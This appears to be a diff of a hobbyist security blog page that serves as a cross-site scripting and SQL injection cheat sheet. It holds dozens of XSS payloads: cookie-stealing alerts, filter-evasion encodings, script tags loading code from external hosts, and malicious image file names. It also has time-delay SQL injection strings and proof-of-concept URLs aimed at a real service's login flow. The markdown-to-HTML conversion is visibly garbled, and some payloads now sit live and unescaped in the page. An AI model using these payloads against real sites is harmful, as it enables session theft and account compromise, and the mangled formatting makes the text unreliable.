@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-09-23T10:54:37 EDT">
+<meta name="revised" content="2019-10-06T00:28:44 EDT">
 <title>USER INPUT OF DOOM :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -769,198 +769,301 @@
 
 <p>So, really i would like to give something fancy here but there isn&rsquo;t anything fancy to say if you get a server error form entering in the basics you have the beginning of sql injection. i often exaggeration sql there are allot of parameters but using the basic open source tools we have in kali is all we need to enumerate sql. while the scanners run do some manual testing.</p>
 
-<p><strong>XSS    CROSS SITE SCRIPTING</strong></p>
+<p>So, Using time delay&rsquo;s is a fancy and easy way to look for sql injection. It can be exceptionally useful during finding blind sql injection the results aren&rsquo;t returned. This is where the time delays technique shines, it can also be useful in other ways like where standard techniques fail supplying crafted input.</p>
 
-<pre><code>&lt;script&gt;alert(123)&lt;/script&gt;
-&lt;SCRIPT SRC=//xss.rocks/.j&gt;
-&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
-\&quot;;alert('XSS');//
-http://m.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
-http://m.com/index.php?user=&lt;script&gt;document.domain&lt;/script&gt;
+<p>```&amp;#39;; wait delay &amp;#39;0:30:0&amp;#39;&ndash;
+&lsquo;; waitfor delay &lsquo;0:30:0&rsquo;&ndash;
+1; waitfor delay &lsquo;0:30:0&rsquo;&ndash;</p>
+
+<pre><code>
+**XSS    CROSS SITE SCRIPTING**
+
+Cross Site Scripting, is a pretty common bug, its also known as html injections. This kind of attack allows Bad guys to injection malicious html into a website without compromising the webserver to inject the malicious code. Typically statically generated sites aren't vulnerable. Dynamic sites where they take user input and generate content for the user supplied input. will have the best affect. Sometims the site &lt;mark&gt; &gt; &lt;/mark&gt; will filter out the wacka sign. Try encoding &lt;mark&gt; &gt; &lt;/mark&gt; to bypass the filters. 
+
 </code></pre>
 
-<p>Crossite-scripting this is more of a cheat sheet than anything.</p>
+<script>alert(123)</script>
+<SCRIPT SRC=//xss.rocks/.j>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+\";alert('XSS');//
+http://m.com/index.php?user=<script>alert(123)</script>
+http://m.com/index.php?user=<script>alert(document.domain)</script>
+```
 
-<p><em>TESTING</em></p>
+```
+%3c     <
+\x3c    <
+%3e     >
+\x3e    >
+%3cscript%3ealert(document.domain)%3cscript%3e
+\x3cscript\x3ealert(document.domain)\x3cscript\x3e
+```
 
-<p><a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></p>
+*TESTING*
 
-<pre><code>&lt;script&gt;alert(123)&lt;/script&gt;
-&lt;script&gt;alert(document.domain)&lt;/script&gt;
- &quot;&gt;&lt;svg/onload=alert(document.domain)&gt;
-&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
 
-&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+```
+<img src="http://&quot;>alert(document.cookie) &quot;>alert(document.cookie) &quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e &quot;>ipt>alert(document.cookie)ipt> %00“>alert(-document.cookie)" class="bbCodeImage wysiwygImage" alt="" unselectable="on">
+
+<img src="http://<script>alert(123)</script> <script>alert(document.domain)</script>  &quot;><svg/onload=alert(document.domain)> <SCRIPT SRC=//xss.rocks/.j>" alt="[IMG]" unselectable="on">
+```
+
+
+
+```
+<script>alert(123)</script>
+"><script>alert(document.domain)</script>
+"><svg/onload=alert(document.domain)>
+<SCRIPT SRC=//xss.rocks/.j>
+
+<<SCRIPT>alert("XSS");//<</SCRIPT>
 
 Escaping jarascript escapes
-\&quot;;alert('XSS');//
+\";alert('XSS');//
 
 Encoding url, little eindian
-&lt;script src=http://www.example.com/malicious-code.js&gt;&lt;/script&gt;
+<script src=http://www.example.com/malicious-code.js></script>
 \x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
 %3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
 
 Body
-&lt;body onload=alert('something')&gt;;
-&quot; onmouseover=alert(1) &quot;
-&lt;img src=x onmouseover=alert(1)&gt;
- &quot;&gt;&lt;svg/onload=alert(document.domain)&gt;
+a 8
+" onmouseover=alert(1) "
+<img src=x onmouseover=alert(1)>
+ "><svg/onload=alert(document.domain)>
 IMG
-&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
-&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMG SRC="javascript:alert('XSS');">
 
 HREF
-&lt;a href=&quot;&lt;script&gt;alert(8007)&lt;/script&gt;&quot;&gt;Click Me&lt;/a&gt;
-&lt;a href=&quot;http://example.com/index.php#anyone=javascript:alert(1234)&quot;&gt;meow&lt;/a&gt; 
-&lt;a href=&quot;http://example.com/index.php?user=&lt;script&gt;alert(document.domain)&lt;/script&gt;
-&quot;&gt;http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
-&lt;/a&gt;
+<a href="<script>alert(8007)</script>">Click Me</a>
+<a href="http://example.com/index.php#anyone=javascript:alert(1234)">meow</a> 
+<a href="http://example.com/index.php?user=<script>alert(document.domain)</script>
+">http://example.com/index.php?user=<script>alert(123)</script>
+</a>
 
-http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
-http://example.com/index.php?user=\&quot;;alert('XSS');//
+http://example.com/index.php?user=<script>alert(document.domain)</script>
+http://example.com/index.php?user=\";alert('XSS');//
 http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e
-http://mdsec.net/error/5/Error.ashx?message=&lt;script&gt;alert(1)&lt;/script&gt;
+http://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>
 
-article.php?title=&lt;meta%20http-equiv=&quot;refresh&quot;%20content=&quot;0;&quot;&gt;
+<p>article.php?title=<meta%20http-equiv="refresh"%20content="0;"></p>
+
+<p><a href="http://alert(123">http://alert(123</a>) alert(document.domain)  &ldquo;&gt;   <alert("XSS");//<  Escaping jarascript escapes \";alert('XSS');//  Encoding url, little eindian  \x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e %3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e  Body  " onmouseover=alert(1) "   "> IMG    HREF alert(8007)&ldquo;&gt;Click Me meow  alert(document.domain) &ldquo;&gt;<a href="http://example.com/index.php?user=alert(123">http://example.com/index.php?user=alert(123</a>)   <a href="http://example.com/index.php?user=alert(123">http://example.com/index.php?user=alert(123</a>) <a href="http://example.com/index.php?user=&quot;;alert('XSS');//">http://example.com/index.php?user=&quot;;alert('XSS');//</a> <a href="http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e">http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e</a> <a href="http://mdsec.net/error/5/Error.ashx?message=alert(1">http://mdsec.net/error/5/Error.ashx?message=alert(1</a>)  article.php?title=</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
-&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
-&quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e
-&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;
-%00“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+<p>&rdquo;&gt;<script >alert(document.cookie)</script >
+&ldquo;&gt;<ScRiPt>alert(document.cookie)</ScRiPt>
+&ldquo;%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+&ldquo;&gt;<scr<script>ipt&gt;alert(document.cookie)</scr</script>ipt&gt;
+%00&rdquo;&gt;<script>alert(document.cookie)</script></p>
+
+<pre><code>
+input is inserted into quotes =D &lt; &quot;userinput&quot;&gt;  sometimes it happens more than youd think. 
 
 </code></pre>
 
-<p>input is inserted into quotes =D &lt; &ldquo;userinput&rdquo;&gt;  sometimes it happens more than youd think.</p>
-
-<pre><code>''; alert(document.domain); var foo=
+<p>&rdquo;; alert(document.domain); var foo=
 javascript:alert(1);
-#”onclick=”javascript:alert(1)
-</code></pre>
+#&ldquo;onclick=&ldquo;javascript:alert(document.domain)</p>
 
-<p>tag attributes</p>
-
-<pre><code>&lt;input type=”text” name=”address1” value=”myxsstestdmqlwp”&gt;
-&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-&quot;&quot; onfocus=&quot;alert(document.domain)
-</code></pre>
-
-<p>Javascript</p>
-
-<pre><code>&lt;script&gt;var a = 'myxsstestdmqlwp'; var b = 123; ... &lt;/script&gt;
-''; alert(1); var foo=’
-</code></pre>
-
-<p>HTML</p>
-
-<pre><code>&lt;p&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;/p&gt;
-&lt;p&gt;&lt;script&gt;alert[1];&lt;/script&gt;&lt;/p&gt;
+<pre><code>
+tag attributes 
 
 </code></pre>
 
-<p>XML**</p>
+<p><input type=”text” name=”address1” value=”myxsstestdmqlwp”>
+&gt;<script>alert(document.domain)</script>
+&ldquo;&rdquo; onfocus=&ldquo;alert(document.domain)</p>
 
-<p><strong>XML</strong> Breaking the command up into segments javascript</p>
+<pre><code>
+Javascript
 
-<pre><code>javascript: Markdown [xss](.alert(123);)
 </code></pre>
 
-<p><img src="/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/xss-xml.png" alt="xss-xml" /></p>
+<p><script>var a = &lsquo;myxsstestdmqlwp&rsquo;; var b = 123; &hellip; </script>
+&ldquo;; alert(1); var foo=’</p>
 
-<pre><code>POC URL 1:
+<pre><code>
+HTML
 
-https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.domain)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop
-POC URL 2:
-
-https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.cookie)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop
 </code></pre>
 
-<p>**#### TESTING #### **</p>
+<p><script>alert(document.domain);</script></p>
+<p><script>alert[1];</script></p>
 
-<pre><code>&lt;HTML&gt;
-&lt;Title&gt;Welcome&lt;/Title&gt;
-Hi&lt;script&gt;alert(123)&lt;/script&gt;
-&lt;/HTML&gt;
+<pre><code>
+IMAGES some times naming a file like this or image can achieve xss elsewhere on the site. 
+
 </code></pre>
 
-<p><strong>####</strong></p>
+<p>&rdquo;&gt;<svg onload=alert(document.domain)>.jpg
+ &ldquo;&gt;<svg/onload=alert(document.domain)>.jpg
+ &ldquo;&gt;<img src=x onerror=prompt(document.domain)>.png</p>
 
-<p>Sometimes evading restrictions on &lt; or bracket can be troublesome.</p>
+<pre><code>
+**#### TESTING #### **
 
-<pre><code>&lt;
+</code></pre>
+
+<p><HTML>
+<Title>Welcome</Title>
+Hi<script>alert(123)</script>
+</HTML></p>
+
+<pre><code>
+**##WORDPRESS##**
+
+https://www.exploit-db.com/exploits/36844
+
+</code></pre>
+
+<p><a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a></p>
+
+<pre><code>
+param url testing 
+
+</code></pre>
+
+<p>/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+ /?param=javascript:alert(document.cookie)</p>
+
+<pre><code>
+Vulnerable code might look like 
+
+**###Bug Bounties Examples###**
+
+http redirect xss
+
+Able to achieve xss by taking advantage of the url redirect and entered some javascript into it nd got xss.
+
+</code></pre>
+
+<p>url.com/login?next=javascript:alert(document.domain)</p>
+
+<pre><code>
+![url-xss](/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/url-xss.png)
+
+</code></pre>
+
+<pre><code>Take this URL: https://app.mopub.com/login?next=https://google.com
+Change &quot;https://google.com&quot; to whatever URL you want to redirect to.
+Visit the URL and login
+You will be redirected to that site
+</code></pre>
+
+<pre><code>
+**XML** Breaking the command up into segments javascript
+
+</code></pre>
+
+<p>javascript: Markdown <a href=".alert(123);">xss</a></p>
+
+<pre><code>
+![xss-xml](/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/xss-xml.png)
+
+</code></pre>
+
+<p>POC URL 1:</p>
+
+<p><a href="https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.domain)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop">https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.domain)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop</a>
+POC URL 2:</p>
+
+<p><a href="https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.cookie)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop">https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.cookie)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop</a></p>
+
+<pre><code>
+
+
+**####**
+
+Sometimes evading restrictions on &lt; or bracket can be troublesome. 
+
+</code></pre>
+
+<p>&lt;
 %3C
 &amp;lt
-&amp;lt;
+&lt;
 &amp;LT
-&amp;LT;
+&LT;
 &amp;#60
 &amp;#060
 &amp;#0060
 &amp;#00060
 &amp;#000060
 &amp;#0000060
-&amp;#60;
-&amp;#060;
-&amp;#0060;
-&amp;#00060;
-&amp;#000060;
-&amp;#0000060;
+&#60;
+&#060;
+&#0060;
+&#00060;
+&#000060;
+&#0000060;
 &amp;#x3c
 &amp;#x03c
 &amp;#x003c
 &amp;#x0003c
 &amp;#x00003c
 &amp;#x000003c
-&amp;#x3c;
-&amp;#x03c;
-&amp;#x003c;
-&amp;#x0003c;
-&amp;#x00003c;
-&amp;#x000003c;
+&#x3c;
+&#x03c;
+&#x003c;
+&#x0003c;
+&#x00003c;
+&#x000003c;
 &amp;#X3c
 &amp;#X03c
 &amp;#X003c
 &amp;#X0003c
 &amp;#X00003c
 &amp;#X000003c
-&amp;#X3c;
-&amp;#X03c;
-&amp;#X003c;
-&amp;#X0003c;
-&amp;#X00003c;
-&amp;#X000003c;
+&#X3c;
+&#X03c;
+&#X003c;
+&#X0003c;
+&#X00003c;
+&#X000003c;
 &amp;#x3C
 &amp;#x03C
 &amp;#x003C
 &amp;#x0003C
 &amp;#x00003C
 &amp;#x000003C
-&amp;#x3C;
-&amp;#x03C;
-&amp;#x003C;
-&amp;#x0003C;
-&amp;#x00003C;
-&amp;#x000003C;
+&#x3C;
+&#x03C;
+&#x003C;
+&#x0003C;
+&#x00003C;
+&#x000003C;
 &amp;#X3C
 &amp;#X03C
 &amp;#X003C
 &amp;#X0003C
 &amp;#X00003C
 &amp;#X000003C
-&amp;#X3C;
-&amp;#X03C;
-&amp;#X003C;
-&amp;#X0003C;
-&amp;#X00003C;
-&amp;#X000003C;
+&#X3C;
+&#X03C;
+&#X003C;
+&#X0003C;
+&#X00003C;
+&#X000003C;
 \x3c
 \x3C
 \u003c
 \u003C
-</code></pre>
+```</p>
+
+<p>**###HTTP REDIRECT###</p>
 
 <p><strong>########### WARNING ###########</strong> DO NOT USES THESE ON ANYONE</p>
+
+<p>payloads</p>
+
+<p><a href="https://github.com/cujanovic/Markdown-XSS-Payloads">https://github.com/cujanovic/Markdown-XSS-Payloads</a></p>
+
+<p><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</a></p>
 
 
     
